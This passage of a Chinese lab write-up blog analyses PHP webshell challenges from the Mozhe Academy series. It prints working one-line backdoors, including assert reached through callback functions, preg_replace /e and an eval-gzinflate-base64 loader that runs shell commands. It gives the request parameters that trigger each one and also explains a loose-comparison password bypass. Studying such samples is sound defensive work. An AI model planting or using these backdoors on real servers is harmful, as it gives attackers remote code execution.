$_REQUEST[<span class="string">'e'</span>];<span class="comment">// $_REQUEST[] POST、GET都可传入参数</span></span><br><span class="line"></span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'REQUEST'</span>]);</span><br><span class="line"></span><br><span class="line">前面已经po出了register_shutdown_function()函数的应用环境，在这里就简单说一下</span><br><span class="line">register_shutdown_function(待执行的函数名,向函数里面传入的值)<span class="comment">//这里依然用 assert 进行构造代码执行</span></span><br><span class="line"></span><br><span class="line">当PHP程序执行完成后，自动执行register_shutdown_function函数，该函数需要一个参数，用来指定由谁处理这些后续的工作。其中，程序执行完成，分为以下几种情况:</span><br><span class="line"></span><br><span class="line">第一种：php代码执行过程中发生错误</span><br><span class="line"></span><br><span class="line">第二种：php代码顺利执行成功</span><br><span class="line"></span><br><span class="line">第三种：php代码运行超时</span><br><span class="line"></span><br><span class="line">第四种：页面被用户强制停止</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">实战</font></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第9题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第8题"><a href="#墨者学院–WebShell代码分析溯源-第8题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第8题)"></a>墨者学院–WebShell代码分析溯源(第8题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line"></span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="array-walk"><a href="#array-walk" class="headerlink" title="array_walk() "></a><a href="https://www.2cto.com/shouce/w3school/php/func_array_walk.asp.html" target="_blank" rel="noopener">array_walk() </a></h3><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><a href="https://www.jb51.net/article/145649.htm" target="_blank" rel="noopener">preg_replace()</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line"></span><br><span class="line">上面定义数组的意思是,通过$_POST[<span class="string">'pass'</span>]传入数组元素的键名,<span class="string">'|.*|e'</span>为该键键值</span><br><span class="line">php定义数组也可以直接输入键值 -&gt; $arr = <span class="keyword">array</span>(键值<span class="number">1</span>,键值<span class="number">2</span>,键值<span class="number">3</span>);</span><br><span class="line">如果php数组里面上述两种情况都出现</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">function test($a,$b)&#123;</span></span><br><span class="line"><span class="string">echo "$a,$b&lt;/br&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a = array(1,"qian"=&gt;"hou",2,3,4);  1,2,3,4相对应的键名不会因为第二个元素的出现发生改变</span></span><br><span class="line"><span class="string">      查看如何输出可以将代码执行</span></span><br><span class="line"><span class="string">array_walk($a,'</span>test<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">array_walk(<span class="keyword">array</span>,<span class="function"><span class="keyword">function</span>,<span class="title">userdata</span>...)</span></span><br><span class="line"><span class="function"><span class="title">array_walk</span><span class="params">(数组名（一个元素的键名与键值当作右侧函数的第二、第一个参数）,定义的函数名,传入的第三个参数)</span></span></span><br><span class="line"><span class="function">利用<span class="title">array_wlak</span>传参的功能，借助 <span class="title">preg_replace</span><span class="params">()</span> 可导致代码执行</span></span><br><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">()</span>：</span></span><br><span class="line"><span class="function">    <span class="title">preg_replace</span>  函数执行一个正则表达式的搜索和替换当开启 /<span class="title">e</span> 模式时，通过正则表达式匹配到的数据会先通过<span class="title">php</span>代    码的方式执行</span></span><br><span class="line"><span class="function">    <span class="title">preg_replace</span> <span class="params">($pattern<span class="params">(正则表达式及相应的模式)</span>,$replacement<span class="params">(待匹配数据)</span>,$subject<span class="params">(待替换数据)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">整体流程分析</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line">    $e = $_REQUEST['e'];  通过REQUEST['e'] 传入 preg_replace() 函数</span><br><span class="line"></span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">'pass'</span>] =&gt; <span class="string">'|.*|e'</span>,); 通过 POST 传入 将要执行的php代码,将该函数与正则表达式<span class="string">'|.*|e'</span></span><br><span class="line">    array_walk($arr, $e, <span class="string">''</span>); -&gt; <span class="keyword">array</span>($arr,preg_replace(),<span class="string">''</span>) <span class="comment">// 第三个参数是将匹配到的字符替换为 ''</span></span><br><span class="line">    </span><br><span class="line">    一定要记住第一个参数(数组)传入的键名与键值分别当作传入函数的第二参数与第一参数, preg_replace 的第二参数才 可以导致代码执行，第一参数用来匹配字符。</span><br><span class="line">    如果传入的代码匹配不完整会导致命令无法执行</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第8题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第7题"><a href="#墨者学院–WebShell代码分析溯源-第7题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第7题)"></a>墨者学院–WebShell代码分析溯源(第7题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'POST'</span>]);</span><br><span class="line"></span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="uasort-Array-MyFunction"><a href="#uasort-Array-MyFunction" class="headerlink" title="uasort(Array,MyFunction)"></a><a href="https://www.w3school.com.cn/php/func_array_uasort.asp" target="_blank" rel="noopener">uasort(Array,MyFunction)</a></h3><h3 id="利用python进行base64加密"><a href="#利用python进行base64加密" class="headerlink" title="利用python进行base64加密"></a>利用python进行base64加密</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>]; <span class="comment">// 传入可执行代码的函数，需要base64编码</span></span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'test'</span>, $_REQUEST[<span class="string">'POST'</span>]);<span class="comment">//向数组中添加一个元素（待执行php命令）</span></span><br><span class="line"></span><br><span class="line">uasort($arr, base64_decode($e));</span><br><span class="line"></span><br><span class="line">uasort(传入的数组,编码后的执行函数)</span><br><span class="line">    </span><br><span class="line">    uasort 将数组传入函数中(参数<span class="number">2</span>)进行重新整合（整合情况根据函数内容决定），在整合过程中会造成php代码执行</span><br><span class="line">    base64编码可利用python内置base64模块进行编码</span><br><span class="line">    base64.b64encode(<span class="string">'待编码字符串'</span>.encode(<span class="string">'urf8'</span>))</span><br><span class="line">    </span><br><span class="line">综上 传入与构造的语句应为：</span><br><span class="line">    e = base64.b64encode(<span class="string">'assert'</span>.encode()) -&gt;YXNzZXJ0 (e = YXNzZXJ0)</span><br><span class="line">    $_REQUEST[<span class="string">'POST'</span>] = phpinfo() <span class="comment">//证明可执行代码即可</span></span><br><span class="line">  $arr = (<span class="string">'test'</span>,<span class="string">'phpinfo()'</span>)</span><br><span class="line">    uasort($arr,<span class="string">'assert'</span>) -&gt; 将<span class="string">'test'</span>,<span class="string">'phpinfo()'</span> 分别传入assert，遇到phpinfo() 进行代码执行</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第7题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第6题"><a href="#墨者学院–WebShell代码分析溯源-第6题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第6题)"></a>墨者学院–WebShell代码分析溯源(第6题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="array-map-MyFunction-Array"><a href="#array-map-MyFunction-Array" class="headerlink" title="array_map(MyFunction,Array)"></a><a href="https://www.w3school.com.cn/php/func_array_map.asp" target="_blank" rel="noopener">array_map(MyFunction,Array)</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line"><span class="comment">//前面都是些老生常谈的东西，在这里就不细说了</span></span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"></span><br><span class="line">array_map(<span class="function"><span class="keyword">Function</span>,<span class="title">Array</span>)</span></span><br><span class="line"><span class="function">    <span class="title">Function</span> 里面有对数组元素内容自定义的操作，传入函数时元素值若为<span class="title">php</span>可执行代码，则会导致代码执行</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">如何用<span class="title">python</span>将字符串加密上面说过了</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">接下来构造传参导致代码执行</span></span><br><span class="line"><span class="function">    <span class="title">e</span> = <span class="title">YXNzZXJ0</span><span class="params">(<span class="string">'assert'</span> base64编码后的内容)</span></span></span><br><span class="line"><span class="function">    <span class="title">POST</span><span class="params">(POST方式)</span> = <span class="title">phpinfo</span><span class="params">()</span> //可证明代码执行即可</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第6题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第5题"><a href="#墨者学院–WebShell代码分析溯源-第5题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第5题)"></a>墨者学院–WebShell代码分析溯源(第5题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>, $_REQUEST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="call-user-func-MyFunction-待传入参数"><a href="#call-user-func-MyFunction-待传入参数" class="headerlink" title="call_user_func(MyFunction,待传入参数)"></a><a href="https://www.php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">call_user_func(MyFunction,待传入参数)</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>, $_REQUEST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line">call_user_func(MyFunction,待传入的参数)</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">function test($a)&#123;</span></span><br><span class="line"><span class="string">echo $a;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">@call_user_func('</span>test<span class="string">',$_POST[cmd]); //test为自定义参数,通过POST传入的参数即运行结果</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">既然能够调用任意函数，当然也能调用可执行代码的危险函数 assert </span><br><span class="line">    因为代码中已经存在 assert 所以在这里直接传入待执行的命令就好</span><br><span class="line">    assert = phpinfo() 这里通过REQUEST传入，POST、GET都可以</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第5题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第4题"><a href="#墨者学院–WebShell代码分析溯源-第4题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第4题)"></a>墨者学院–WebShell代码分析溯源(第4题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e=$_REQUEST[<span class="string">'e'</span>];$arr=<span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);array_filter($arr,base64_decode($e));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><p><a href="https://www.w3school.com.cn/php/func_array_filter.asp" target="_blank" rel="noopener">array_filter(Array,MyFunction)</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e=$_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">$arr=<span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line"></span><br><span class="line">array_filter($arr,base64_decode($e));</span><br><span class="line"></span><br><span class="line">array_filter 的作用是将数组内元素传入待定的函数中，若函数返回值为<span class="keyword">True</span>则数组元素保留，返回<span class="keyword">False</span>则不保留</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">                    &lt;?php</span></span><br><span class="line"><span class="string">                        function test_odd($var)</span></span><br><span class="line"><span class="string">                        &#123;</span></span><br><span class="line"><span class="string">                            return $var&gt;2; // $var的值如果&lt;2 返回False</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        $a1=array("a","b",2,3,4);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        print_r(array_filter($a1,"test_odd"));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    ?&gt;</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span><span class="comment">//程序运行结果会很直观的解释 array_filter 的作用</span></span><br><span class="line">    </span><br><span class="line">有传参的过程，函数名可控，参数可控 则可构造代码执行语句</span><br><span class="line">    e 依旧传入assert的base64编码 YXNzZXJ0</span><br><span class="line">    POST 传值为 phpinfo()</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第4题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第3题"><a href="#墨者学院–WebShell代码分析溯源-第3题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第3题)"></a>墨者学院–WebShell代码分析溯源(第3题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$g = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">'s'</span>);</span><br><span class="line"></span><br><span class="line">$gg = a.$g[<span class="number">1</span>].ser.chr(<span class="string">'116'</span>);</span><br><span class="line"></span><br><span class="line">@$gg($_POST[get]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$g = <span class="keyword">array</span>(<span class="string">''</span>,<span class="string">'s'</span>);</span><br><span class="line"></span><br><span class="line">$gg = a.$g[<span class="number">1</span>].ser.chr(<span class="string">'116'</span>); <span class="comment">//chr 为ASCII的解码 116对应的解码内容为：t</span></span><br><span class="line">   <span class="comment">//所以$gg = assert</span></span><br><span class="line">@$gg($_POST[get]); <span class="comment">// 这里直接传想执行的代码即可</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第3题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第2题"><a href="#墨者学院–WebShell代码分析溯源-第2题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第2题)"></a>墨者学院–WebShell代码分析溯源(第2题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$POST[<span class="string">'POST'</span>]=<span class="string">'assert'</span>;</span><br><span class="line"></span><br><span class="line">$array[]=$POST;</span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>][<span class="string">'POST'</span>]($_POST[<span class="string">'assert'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$POST[<span class="string">'POST'</span>]=<span class="string">'assert'</span>; <span class="comment">//将键名：POST 键值：assert 的一个数组元素放入 $POST 数组内</span></span><br><span class="line"></span><br><span class="line">$array[]=$POST; <span class="comment">// 将数组 $POST 放入 数组 $array 里面构造一个二维数组</span></span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>][<span class="string">'POST'</span>]($_POST[<span class="string">'assert'</span>]); 这里的$array[<span class="number">0</span>][<span class="string">'POST'</span>]即 <span class="string">'assert'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    所以该一句话木马最终构造为: assert($_POST[<span class="string">'assert'</span>]) 通过POST传入待执行的php命令</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第2题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第1题"><a href="#墨者学院–WebShell代码分析溯源-第1题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第1题)"></a>墨者学院–WebShell代码分析溯源(第1题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'POST'</span>]($_POST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'POST'</span>]($_POST[<span class="string">'GET'</span>]);  <span class="comment">//利用POST、GET传值，直接构造可执行语句即可</span></span><br><span class="line"></span><br><span class="line">POST = assert</span><br><span class="line">GET  = phpinfo()</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第1题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="PHP代码分析溯源-第4题"><a href="#PHP代码分析溯源-第4题" class="headerlink" title="PHP代码分析溯源(第4题)"></a>PHP代码分析溯源(第4题)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="base64-gzinflate压缩编码（加密）文件"><a href="#base64-gzinflate压缩编码（加密）文件" class="headerlink" title="base64+gzinflate压缩编码（加密）文件"></a><a href="https://blog.csdn.net/forest_fire/article/details/50944216" target="_blank" rel="noopener">base64+gzinflate压缩编码（加密）文件</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"></span><br><span class="line">gzinflate(base64_decode()) 用来解密base64+压缩编码处理后的字符串</span><br><span class="line">如果想看到编码内容 可以将<span class="keyword">eval</span>替换为<span class="keyword">echo</span>（在本题中适用，正常情况下大多需要密码进行解密）</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> 的编码内容为：<span class="keyword">echo</span> `$_REQUEST[a]`;; <span class="meta">?&gt;</span> </span><br><span class="line">php 中的 ` (反引号)内的字符串当作系统命令执行 <span class="keyword">echo</span> 会将命令执行的结果输出（如果没有 <span class="keyword">echo</span> 命令照样执行）</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/PHP代码分析溯源(第4题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="PHP代码分析溯源-第3题"><a href="#PHP代码分析溯源-第3题" class="headerlink" title="PHP代码分析溯源(第3题)"></a>PHP代码分析溯源(第3题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $one = ord(<span class="string">'1'</span>);  <span class="number">49</span></span><br><span class="line">     $nine = ord(<span class="string">'9'</span>); <span class="number">57</span></span><br><span class="line">     <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_POST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    此处省略</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="php字符串与数字比较的不同方法"><a href="#php字符串与数字比较的不同方法" class="headerlink" title="php字符串与数字比较的不同方法"></a>php字符串与数字比较的不同方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $one = ord(<span class="string">'1'</span>);  <span class="number">49</span></span><br><span class="line">     $nine = ord(<span class="string">'9'</span>); <span class="number">57</span></span><br><span class="line">     <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>; <span class="comment">// 这里必须是双等号，三等号不支持上述HEX比较方法</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_POST[<span class="string">'pass'</span>]))&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    此处省略</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">在这解释一下程序的运行逻辑：</span><br><span class="line">    自定函数 noother_says_correct() 判断传入的值是否等于<span class="number">54975581388</span> 且每个位数上面的数字是否否和 <span class="keyword">for</span> 循环里面的判断条件（每位数&lt;<span class="number">1</span>&amp;&amp;&gt;<span class="number">9</span>）正常输入key是不可能符合条件的。但是呢 php在变量与数字比较过程中可以通过HEX进行比较 即 <span class="number">54975581388</span> = <span class="number">0xccccccccc</span> 这样就会符合条件 